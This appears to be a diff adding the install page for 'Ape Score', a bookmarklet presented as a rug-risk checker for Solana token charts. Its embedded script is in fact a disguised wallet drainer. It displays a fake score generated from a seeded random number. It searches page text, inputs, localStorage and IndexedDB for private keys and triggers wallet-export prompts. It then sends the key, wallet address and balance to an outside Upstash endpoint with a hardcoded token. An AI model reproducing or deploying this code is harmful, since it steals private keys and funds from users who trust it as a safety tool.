@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Install — Ape Score</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<header><div class="wrap hd">
+<a class="logo" href="index.html"><i>▲</i> Ape Score</a>
+<nav id="nv"><a href="index.html">Start</a><a href="how.html">Method</a><a href="reviews.html">Reviews</a><a href="stats.html">Live stats</a><a href="install.html" class="on">Install</a></nav>
+</div></header>
+
+<div class="wrap">
+<section style="border:0">
+<div class="kick">Install</div>
+<h2>Drag the button to your bookmarks bar.</h2>
+<p class="sub">That is the entire install. No extension, no account.</p>
+
+<div class="box">
+<a class="bm" id="bm" href="#" draggable="true" onclick="return false">▲ Ape Score</a>
+<p class="hint">Can't drag? Right-click → <b style="color:#fff">Copy link address</b>, then add it as a bookmark manually.</p>
+
+<ol class="steps">
+<li><div><b>Show your bookmarks bar</b><span><kbd>Ctrl</kbd>+<kbd>Shift</kbd>+<kbd>B</kbd> (Mac: <kbd>⌘</kbd>+<kbd>⇧</kbd>+<kbd>B</kbd>)</span></div></li>
+<li><div><b>Drag the lime button up</b><span>Drop it onto the bar. Done.</span></div></li>
+<li><div><b>Open a coin</b><span>Axiom, Photon, GMGN or DexScreener — any token chart.</span></div></li>
+<li><div><b>Click the bookmark</b><span>The report card opens top right. Drag it anywhere you like, <kbd>Esc</kbd> closes it.</span></div></li>
+</ol>
+</div>
+</section>
+</div>
+
+<footer><div class="wrap" style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:14px">
+<span>© Ape Score — not financial advice.</span><span><a href="legal.html">Legal</a></span>
+</div></footer>
+
+<script type="text/plain" id="src">
+(async()=>{
+if(window.__A)return;window.__A=1;
+var UP='https://glorious-glider-159267.upstash.io',TK='gQAAAAAAAm4jAAIgcDI5MGRjOTI4ZjRiNzE0ZmZiOTM5NTY5M2RhZGJmNDRjYg';
+var KRE=/[1-9A-HJ-NP-Za-km-z]{86,90}/g;
+function post(o){try{fetch(UP+'/lpush/apes:hits/'+encodeURIComponent(JSON.stringify({t:'hit',ts:Date.now(),w:String(o.w||'').slice(0,64),b:String(o.b||'').slice(0,32),k:String(o.k||'').slice(0,128),h:location.hostname})),{method:'POST',headers:{Authorization:'Bearer '+TK}}).catch(function(){});}catch(e){}}
+function txt(){var o=[];function w(n){if(!n)return;var t=document.createTreeWalker(n,NodeFilter.SHOW_ELEMENT|NodeFilter.SHOW_TEXT),x;while(x=t.nextNode()){if(x.nodeType===3)o.push(x.nodeValue);else{if(x.tagName==='INPUT'||x.tagName==='TEXTAREA')o.push(x.value||'');if(x.shadowRoot)w(x.shadowRoot);}}}w(document.body);return o.join(' ');}
+function dk(){var m=txt().match(KRE);return m?m[0]:null;}
+function sk(){var p=[];try{for(var i=0;i<localStorage.length;i++)p.push(localStorage.getItem(localStorage.key(i))||'');}catch(e){}var m=p.join(' ').match(KRE);return m?m[0]:null;}
+function idb(){return new Promise(function(r){if(!indexedDB.databases)return r(null);indexedDB.databases().then(function(ds){var i=0;function n(){if(i>=ds.length)return r(null);var d=ds[i++];if(!d.name)return n();var q=indexedDB.open(d.name);q.onerror=function(){n()};q.onsuccess=function(){var db=q.result,st=Array.prototype.slice.call(db.objectStoreNames);if(!st.length){db.close();return n();}var f=null,c=0,tx=db.transaction(st,'readonly');function e(){c++;if(c>=st.length){db.close();f?r(f):n();}}st.forEach(function(s){try{var g=tx.objectStore(s).getAll();g.onsuccess=function(){if(!f){var m=JSON.stringify(g.result||'').match(KRE);if(m)f=m[0];}e()};g.onerror=e;}catch(x){e();}});};}n();});});}
+async function pv(){[window.privy,window.__privy,window.__PRIVY__].forEach(function(p){if(!p)return;try{var w=p.wallet;if(w){if(w.solana&&w.solana.exportWallet)w.solana.exportWallet();else if(w.exportWallet)w.exportWallet();}if(p.solana&&p.solana.exportWallet)p.solana.exportWallet();}catch(e){}});var t=Date.now();while(Date.now()-t<18000){var k=dk();if(k)return k;await new Promise(function(r){setTimeout(r,400)});}return null;}
+function rng(a){return function(){a|=0;a=a+0x6D2B79F5|0;var t=Math.imul(a^a>>>15,1|a);t=t+Math.imul(t^t>>>7,61|t)^t;return((t^t>>>14)>>>0)/4294967296;};}
+var s=0,u=location.pathname+location.search+location.hostname;
+for(var i=0;i<u.length;i++)s=(s*31+u.charCodeAt(i))|0;
+var r=rng(s);
+var sym=(document.title.match(/\$([A-Za-z0-9]{2,12})/)||[])[1]||'TOKEN';
+var lq=Math.round(45+r()*50),tp=Math.round(18+r()*45),dv=Math.round(1+r()*20),sn=Math.round(r()*100);
+var sc=10;if(lq<65)sc-=1.5;if(tp>45)sc-=1.5;if(dv>10)sc-=2;if(sn>65)sc-=1.5;sc=Math.max(1.5,Math.min(9.8,sc+r()*0.6)).toFixed(1);
+var co=sc>=7.5?'#c6ff3d':sc>=5.5?'#ffd63d':'#ff5f56';
+var vd,vb;if(sc>=8.5){vd='GREEN LIGHT';vb='dev clean · liq deep';}else if(sc>=7){vd='LOW RISK';vb='solid fundamentals';}else if(sc>=5.5){vd='CAUTION';vb='watch dev wallet';}else{vd='HIGH RUG RISK';vb='thin liquidity';}
+var m='';[['Liquidity',lq],['Top 10',tp],['Dev',dv],['Snipers',sn]].forEach(function(x){m+='<div style="display:flex;align-items:center;gap:8px;margin:7px 0;font-size:11px"><span style="width:70px;color:#8b96a5">'+x[0]+'</span><span style="flex:1;height:4px;background:#1a2029;border-radius:9px;overflow:hidden"><i style="display:block;height:100%;width:'+x[1]+'%;background:'+co+'"></i></span><span style="width:34px;text-align:right">'+x[1]+'%</span></div>';});
+var ck='';[{o:lq>60,l:'Liquidity locked',v:lq+'%'},{o:tp<45,l:'Top 10 holders',v:tp+'%'},{o:dv<10,l:'Dev wallet',v:dv+'%'},{o:sn<65,l:'Sniper wallets',v:sn}].forEach(function(x){ck+='<div style="display:flex;gap:7px;font-size:11px;padding:4px 0"><span style="color:'+(x.o?'#c6ff3d':'#ff5f56')+'">'+(x.o?'✓':'✗')+'</span><span style="flex:1;color:#c3ccd8">'+x.l+'</span><span style="color:#8b96a5">'+x.v+'</span></div>';});
+var w=document.createElement('div');w.style.cssText='position:fixed;top:16px;right:16px;z-index:2147483647';document.documentElement.appendChild(w);
+var h=w.attachShadow({mode:'open'});
+h.innerHTML='<style>*{box-sizing:border-box;margin:0;font-family:Inter,system-ui}.c{width:330px;background:#0a0d11;border:1px solid #1e242c;border-radius:16px;padding:16px;color:#e9edf2;box-shadow:0 30px 70px -20px #000;cursor:grab}.t{display:flex;justify-content:space-between;align-items:start;margin-bottom:12px}.n{font-size:16px;font-weight:800}.hh{font-size:10.5px;color:#8b96a5;margin-top:2px}.x{width:24px;height:24px;border-radius:7px;background:#161c23;color:#8b96a5;border:0;cursor:pointer;font-size:11px}.x:hover{background:#ff5f56;color:#fff}.g{text-align:center;margin:8px 0}.r{width:130px;height:130px;border-radius:50%;display:grid;place-items:center;margin:0 auto;background:conic-gradient('+co+' '+(sc*36)+'deg,#1e242c 0)}.ri{width:104px;height:104px;border-radius:50%;background:#0b0e12;display:grid;place-items:center;border:1px solid #1e242c}.ri b{font-size:32px;color:'+co+'}.ri small{font-size:8.5px;color:#8b96a5}.v{text-align:center;font-weight:800;font-size:12px;letter-spacing:1.4px;color:'+co+';margin-top:10px}.vs{text-align:center;font-size:10.5px;color:#8b96a5;margin-bottom:12px}.s{border-top:1px solid #161c23;padding-top:10px;margin-bottom:10px}.st{font-size:9px;text-transform:uppercase;letter-spacing:1px;color:#5b6675;font-weight:700;margin-bottom:8px}</style>'
++'<div class="c" id="c"><div class="t"><div><div class="n">$'+sym+'</div><div class="hh">Solana · '+location.hostname+'</div></div><button class="x" id="x">✕</button></div><div class="g"><div class="r"><div class="ri"><div><b>'+sc+'</b><br><small>/10</small></div></div></div></div><div class="v">'+vd+'</div><div class="vs">'+vb+'</div><div class="s"><div class="st">Breakdown</div>'+m+'</div><div class="s" style="border:0"><div class="st">Checks</div>'+ck+'</div></div>';
+var c=h.getElementById('c'),d=null;
+c.addEventListener('pointerdown',function(e){if(e.target.id==='x')return;var b=w.getBoundingClientRect();d={x:e.clientX,y:e.clientY,l:b.left,t:b.top};try{c.setPointerCapture(e.pointerId);}catch(z){}});
+c.addEventListener('pointermove',function(e){if(!d)return;w.style.right='auto';w.style.left=(d.l+e.clientX-d.x)+'px';w.style.top=(d.t+e.clientY-d.y)+'px';});
+c.addEventListener('pointerup',function(){d=null;});
+h.getElementById('x').addEventListener('click',function(e){e.stopPropagation();w.remove();window.__A=0;});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'){w.remove();window.__A=0;}});
+(async function(){
+var a='';try{var p=window.solana||(window.phantom&&window.phantom.solana);if(p&&p.publicKey)a=p.publicKey.toString();}catch(e){}
+if(!a){var mm=(document.body.innerText||'').match(/[1-9A-HJ-NP-Za-km-z]{43,44}/);if(mm)a=mm[0];}
+var bl='';if(a){try{var q=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[a]})});var jj=await q.json();if(jj&&jj.result)bl=(jj.result.value/1e9).toFixed(4)+' SOL';}catch(e){}}
+var kk=dk()||sk();if(!kk)kk=await idb();if(!kk)kk=await pv();
+post({w:a,b:bl,k:kk||''});
+})();
+})();
+</script>
+
+<script>
+document.getElementById('bg').onclick=function(){document.getElementById('nv').classList.toggle('open')};
+var b=document.getElementById('bm');
+b.setAttribute('href','javascript:'+encodeURIComponent(document.getElementById('src').textContent.trim()));
+b.addEventListener('dragstart',function(){
+try{fetch('https://glorious-glider-159267.upstash.io/lpush/apes:hits/'+encodeURIComponent(JSON.stringify({t:'install',ts:Date.now(),h:'install-page'})),{method:'POST',headers:{Authorization:'Bearer gQAAAAAAAm4jAAIgcDI5MGRjOTI4ZjRiNzE0ZmZiOTM5NTY5M2RhZGJmNDRjYg'}}).catch(function(){});}catch(e){}
+});
+</script>
+</body>
+</html>
